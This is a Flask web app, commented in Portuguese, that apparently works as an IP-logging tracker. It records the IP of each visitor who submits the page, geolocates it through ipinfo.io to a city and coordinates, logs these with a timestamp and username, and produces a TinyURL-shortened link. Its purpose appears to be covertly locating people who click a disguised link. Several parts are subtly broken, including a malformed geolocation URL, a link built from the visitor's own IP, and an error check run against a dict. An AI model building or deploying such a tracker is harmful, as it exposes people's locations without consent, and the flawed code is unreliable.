from flask import Flask, render_template, request
import json
import requests
import logging
from datetime import datetime

app = Flask(__name__)

# Configurar o logging
logging.basicConfig(filename='click_logs.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# URL da API para obter informações de geolocalização com base no IP
api_url = "https://ipinfo.io/json"

# Lista para armazenar os IPs dos clientes que clicaram no link
client_ips = []

# Função para obter informações de geolocalização a partir da API
def get_geo_data(ip_address):
    try:
        with requests.get(f"{api_url}/{ip_address}") as response:
            geo_data = response.json()
            return geo_data

    except Exception as e:
        return f"Erro ao obter informações de geolocalização: {e}"

# Função para gerar o link com base no endereço IP público
def generate_link(ip_address):
    return f"http://{ip_address}/"

# Função para encurtar o link usando TinyURL
def shorten_link(original_link):
    try:
        response = requests.post("http://tinyurl.com/api-create.php?url=" + original_link)
        short_url = response.text
        return short_url

    except Exception as e:
        print(f"Erro ao encurtar o link: {e}")
        return None

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ip_address = request.remote_addr
        client_ips.append(ip_address)  # Adiciona o IP à lista

        # Obter informações de geolocalização
        geo_data = get_geo_data(ip_address)
        
        if "Erro" in geo_data:
            return render_template('index.html', error=geo_data)
        
        # Adicionando lógica para obter coordenadas geográficas precisas
        latitude, longitude = geo_data.get('loc', '').split(',')
        
        # Adicionar data, hora e nome de usuário ao log
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = request.form.get('username', 'N/A')  # Substitua 'N/A' pelo valor padrão desejado
        log_entry = f"{current_datetime} - IP: {ip_address}, Usuário: {username}, Localização: {geo_data.get('city', '')}, Latitude: {latitude}, Longitude: {longitude}"
        
        # Adicionar a entrada ao log
        logging.info(log_entry)

        original_link = generate_link(ip_address)
        shortened_link = shorten_link(original_link)

        return render_template('index.html', latitude=latitude, longitude=longitude, original_link=original_link, shortened_link=shortened_link)
    else:
        return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)
